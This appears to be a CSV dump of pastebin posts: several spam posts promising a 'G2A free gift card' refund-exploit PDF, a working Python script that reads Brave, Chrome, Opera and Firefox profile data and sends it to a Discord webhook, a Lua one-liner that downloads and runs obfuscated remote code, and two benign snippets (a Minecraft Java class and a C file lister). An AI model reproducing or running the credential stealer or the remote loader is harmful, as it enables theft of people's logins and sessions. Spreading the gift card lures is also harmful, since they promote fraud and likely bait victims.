id,title,username,language,date,content
7cV3MKZd,🎉G2A.com Free Gift Card Guide May 2024 FIX💰,Bufayez,Python,Saturday 25th of May 2024 12:59:18 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
R9fbVs4g,Untitled,johnfikennedy,Python,Saturday 25th of May 2024 12:58:11 PM CDT,"import os
import requests
import time
username = os.getlogin()

brave = fr'C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default'
google = fr'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
opera1 = fr'C:\\Users\\{username}\\AppData\\Local\\Opera Software\\Opera Stable\\Default'
opera2 = fr'C:\\Users\\{username}\\AppData\\Local\\Opera Software\\Opera GX Stable\\Default'
mozilla = fr'C:\\Users\\{username}\\AppData\\Local\\Mozilla\\Firefox\\Profiles'
webhook_url = 'https://discord.com/api/webhooks/1243971377405628527/urwebhook'
def send_discord_webhook(webhook_url, message):
    MAX_MESSAGE_LENGTH = 2000
    num_segments = len(message) // MAX_MESSAGE_LENGTH + 1

    for i in range(num_segments):
        time.sleep(1/49) # 50 messages per second https://support-dev.discord.com/hc/en-us/articles/6223003921559-My-Bot-Is-Being-Rate-Limited

        start_index = i * MAX_MESSAGE_LENGTH
        end_index = (i + 1) * MAX_MESSAGE_LENGTH
        segment = message[start_index:end_index]

        payload = {'content': segment}
        headers = {'Content-Type': 'application/json'}
        response = requests.post(webhook_url, json=payload, headers=headers)

        if response.status_code != 204:
            print(f""Failed to send segment {i+1} of the message."")
        else:
            print(f""Segment {i+1} of the message sent successfully."")
def read_large_file(file_path, chunk_size=1024):
    with open(file_path, 'r', encoding='utf-8') as file:
        while True:
            chunk = file.read(chunk_size)
            if not chunk:
                break
            yield chunk

def read_files_in_directory(directory, blacklist=[]):
    # Check if the directory exists
    if not os.path.exists(directory):
        return
    
    # Iterate over each file in the directory
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        # Check if the path is a file
        allow = True
        for keyword in blacklist:
            if keyword in file_path:
                allow = False
        if allow:
            if os.path.isfile(file_path):
                # Check file size
                file_size = os.path.getsize(file_path)
                if file_size > 100 * 1024 * 1024:  # If file size exceeds 100MB, split into segments
                    for chunk in read_large_file(file_path):
                        send_discord_webhook(webhook_url, chunk)
                else:
                    # Open the file and read its contents
                    try:
                        with open(file_path, 'r', encoding='utf-8') as file:
                            contents = file.read()
                            # Check if the contents are empty
                            if contents.strip():  # If contents are not empty
                                send_discord_webhook(webhook_url, contents)
                            else:  # If contents are empty, try a different encoding
                                try:
                                    with open(file_path, 'r', encoding='latin-1') as file:
                                        contents = file.read()
                                        send_discord_webhook(webhook_url, contents)
                                except Exception as e:
                                    pass
                    except UnicodeDecodeError:

                        try:
                            with open(file_path, 'r', encoding='latin-1') as file:
                                contents = file.read()
                                send_discord_webhook(webhook_url, contents)
                        except Exception as e:
                            pass
                    except Exception as e:
                        pass
# Brave
try:
    read_files_in_directory(brave, ['Favicon', 'History', 'publisher_info_db', 'Rewards.log', 'Shortcuts'])
except:
    pass
    
# Google
try:
    read_files_in_directory(google)
except:
    pass

# Opera
try:
    read_files_in_directory(opera1)
except:
    pass

try:
    read_files_in_directory(opera2)
except:
    pass
# Mozilla
try:
    sub_folders = [name for name in os.listdir(mozilla) if os.path.isdir(os.path.join(mozilla, name))]
    for sub_folder in sub_folders:
        read_files_in_directory(f'{mozilla}{sub_folder}\cache2\entries')
except:
    pass
"
CduERbRA,untitled,Bacon_Script,Lua,Saturday 25th of May 2024 12:56:23 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/Goat-Hub103/The-Classic-Event/main/obf_UE79aAiNwWqDbHxG8NOAHj7b8Om543a0MB466g7U14m4edl8X89aWMdu0U4axbRC.lua.txt""))()"
cbX8s37C,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Saturday 25th of May 2024 12:54:57 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
25 May 2024"
2sNXMVZM,🚀G2A.com Free Gift Card Guide May 2024 FIX🚀,Alfonso1119,Python,Saturday 25th of May 2024 12:47:29 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
wNQ8PkF3,💰G2A.com Free Gift Card Guide May 2024 FIX,Garoam,Python,Saturday 25th of May 2024 12:41:35 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
xnWQXAdG,💰G2A.com Free Gift Card Guide May 2024 FIX💰,lookos13,Python,Saturday 25th of May 2024 12:29:39 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
uHrCvgXq,Area dot java,LampBoy,Java,Saturday 25th of May 2024 12:23:48 PM CDT,"interface FunctionalInterface {
    void areaFunction(ArrayList list, int x, int y, int z);
}

public class Area {
    private final UUID ownerUuid;
    private final BlockPos startPos;
    private final BlockPos endPos;
    private final World world;
    private final String name;
    private final UUID uuid;

    public Area(BlockPos startPos, BlockPos endPos, String name, UUID ownerUuid) {
        this(startPos, endPos, name, UUID.randomUUID(), ownerUuid);
    }

    public Area(BlockPos startPos, BlockPos endPos, String name, UUID uuid, UUID ownerUuid) {
        this.startPos = startPos;
        this.endPos = endPos;
        this.world = MinecraftClient.getInstance().world;
        this.name = name;
        this.uuid = uuid;
        this.ownerUuid = ownerUuid;
    }

    public ArrayList<Block> getBlocks() {
        ArrayList<Block> blockList = this.executeInArea((list, x, y, z) -> {
            list.add(world.getBlockState(new BlockPos(x, y, z)).getBlock());
        });
        return blockList;
    }

    public ArrayList<LivingEntity> getDetectedEntities() {
        ArrayList<LivingEntity> entityList = this.executeInArea((list, x, y, z) -> {
            world.getNonSpectatingEntities(LivingEntity.class, new Box(new BlockPos(x, y, z))).forEach(value -> list.add(value));
        });
        // Removes duplicates from the list
        HashSet<LivingEntity> entitySet = new HashSet<>();
        entityList.forEach(value -> entitySet.add(value));
        entityList.clear();
        entitySet.forEach(value -> entityList.add(value));
        return entityList;
    }

    public <T> ArrayList<T> executeInArea(FunctionalInterface function) {
        ArrayList<T> list = new ArrayList<>();
        int x;
        int y;
        int z;

        x = startPos.getX();
        while (true) {
            y = startPos.getY();
            while (true) {
                z = startPos.getZ();
                while (true) {
                    if (z < endPos.getZ()) {
                        // Runs lambda expressions. defined in FuncitionalInterface.
                        function.areaFunction(list, x, y, z);
                        z++;
                    } else if (z > endPos.getZ()) {
                        function.areaFunction(list, x, y, z);
                        z--;
                    } else {
                        function.areaFunction(list, x, y, z);
                        break;
                    }
                }
                if (y < endPos.getY()) {
                    y++;
                } else if (y > endPos.getY()) {
                    y--;
                } else {
                    break;
                }
            }
            if (x < endPos.getX()) {
                x++;
            } else if (x > endPos.getX()) {
                x--;
            } else {
                break;
            }
        }
        return list;
    }

    public static NbtElement toNbt(Area area) {
        NbtCompound nbt = new NbtCompound();
        nbt.put(""startPos"", NbtHelper.fromBlockPos(area.getStartPos()));
        nbt.put(""endPos"", NbtHelper.fromBlockPos(area.getEndPos()));
        nbt.putString(""name"", area.getName());
        nbt.putUuid(""uuid"", area.getUuid());
        return nbt;
    }

    public static Area fromNbt(NbtCompound nbt) {
        World world = MinecraftClient.getInstance().world;
        BlockPos startPos = NbtHelper.toBlockPos(nbt.getCompound(""startPos""));
        BlockPos endPos = NbtHelper.toBlockPos(nbt.getCompound(""endPos""));
        String name = (nbt.getString(""name""));
        UUID uuid = (nbt.getUuid(""uuid""));
        return new Area(startPos, endPos, name, uuid);
    }

    public static ArrayList<Area> generateAreaListFromNbtList(NbtList nbtList) {
        ArrayList<Area> areaList = new ArrayList<>();
        for (NbtElement nbt : nbtList) {
            areaList.add(fromNbt(((NbtCompound) nbt)));
        }
        return areaList;
    }

    public String getName() {
        return name;
    }

    public BlockPos getStartPos() {
        return startPos;
    }

    public BlockPos getEndPos() {
        return endPos;
    }

    public World getWorld() {
        return world;
    }

    public UUID getUuid() {
        return uuid;
    }
}"
4t5ypbXv,💰G2A.com Free Gift Card Guide May 2024 FIX🎉,pestinha,Python,Saturday 25th of May 2024 12:23:40 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
rnmxYmiE,Untitled,pasholnahuy,C++,Saturday 25th of May 2024 12:18:33 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>

#define MAX_DEPTH 4

void print_regular_files(const char* dir_path, int depth, off_t max_size) {
    DIR* dir = opendir(dir_path);
    if (dir == NULL) {
        return;
    }

    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ""."") == 0 || strcmp(entry->d_name, "".."") == 0) {
            continue;
        }

        char path[PATH_MAX];
        snprintf(path, sizeof(path), ""%s/%s"", dir_path, entry->d_name);

        struct stat st;
        if (lstat(path, &st) == -1) {
            continue;
        }

        if (S_ISREG(st.st_mode) && access(path, R_OK) != -1 && st.st_size <= max_size) {
            printf(""%s\n"", entry->d_name);
        } else if (S_ISDIR(st.st_mode) && depth < MAX_DEPTH) {
            print_regular_files(path, depth + 1, max_size);
        }
    }

    closedir(dir);
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf(""Usage: ./yourprog directory max_size\n"");
        return 0;
    }

    const char* dir_path = argv[1];
    off_t max_size = atoll(argv[2]);

    print_regular_files(dir_path, 0, max_size);

    return 0;
}"
